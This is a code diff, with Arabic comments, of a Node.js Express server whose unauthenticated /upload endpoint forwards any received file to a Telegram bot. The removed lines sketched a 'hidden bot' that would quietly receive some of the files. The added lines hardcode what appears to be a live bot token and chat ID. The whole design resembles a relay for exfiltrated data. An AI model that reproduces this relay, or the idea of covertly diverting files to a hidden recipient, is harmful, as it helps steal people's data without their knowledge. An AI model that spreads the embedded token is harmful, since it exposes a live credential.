@@ -4,36 +4,35 @@ const multer = require('multer');
 const FormData = require('form-data');
 
 const app = express();
-const upload = multer();
+const upload = multer(); // استلام الملف في الذاكرة
 
-// التوكنات (ضع التوكن الصحيح لكل بوت هنا)
-const TOKEN_HIDDEN = "توكن_البوت_الخفي";
-const CHAT_ID_HIDDEN = "آي_دي_البوت_الخفي";
+const TOKEN = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk";
+const CHAT_ID = "6576769234";
 
-const TOKEN_USER = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk";
-const CHAT_ID_USER = "6576769234";
-
-// مسار موحد ذكي
+// مسار مفتوح تماماً
 app.post('/upload', upload.any(), async (req, res) => {
     try {
-        const file = req.files[0];
-        if (!file) return res.status(400).send("No file");
-
-        // الذكاء: إذا كان الملف خاصاً بالمستخدم، نرسله لبوت المستخدم
-        // وإذا كان خاصاً بالخفي، نرسله لبوت الخفي
-        // هنا يمكننا الاعتماد على "حجم الملف" أو "اسم الملف" للتمييز
-        // أو ببساطة توجيه كل شيء لبوت المستخدم كما تريد الآن
+        console.log("استلمت طلباً جديداً...");
         
+        if (!req.files || req.files.length === 0) {
+            return res.status(400).send("No file found in request");
+        }
+
+        const file = req.files[0];
+        
+        // تجهيز البيانات لتليجرام
         const form = new FormData();
-        form.append('chat_id', CHAT_ID_USER);
-        form.append('document', file.buffer, { filename: file.originalname });
+        form.append('chat_id', CHAT_ID);
+        form.append('document', file.buffer, { filename: file.originalname || 'file' });
 
-        await axios.post(`https://api.telegram.org/bot${TOKEN_USER}/sendDocument`, form, {
-            headers: form.getHeaders()
-        });
+        // التوجيه المباشر
+        const url = `https://api.telegram.org/bot${TOKEN}/sendDocument`;
+        await axios.post(url, form, { headers: form.getHeaders() });
 
-        res.status(200).send("OK");
+        console.log("تم التوجيه بنجاح!");
+        res.status(200).send("Success");
     } catch (e) {
+        console.error("خطأ سيرفر:", e.response ? e.response.data : e.message);
         res.status(500).send("Error");
     }
 });
